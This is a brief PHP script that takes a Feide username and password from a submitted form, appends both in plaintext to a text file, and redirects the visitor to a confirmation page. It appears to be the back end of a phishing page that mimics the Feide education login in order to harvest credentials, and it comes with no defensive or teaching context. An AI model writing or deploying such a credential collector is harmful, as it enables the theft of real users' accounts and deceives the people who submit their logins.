<?php
// Get the username and password from the POST request
$username = $_POST['feidename'] ?? 'No username provided';
$password = $_POST['password'] ?? 'No password provided';

// Log the credentials to a file
file_put_contents("usernames.txt", "Feide Username: " . $username . " Pass: " . $password . "\n", FILE_APPEND);

// Redirect to a confirmation page
header('Location: confirmation.html');
exit();
?>
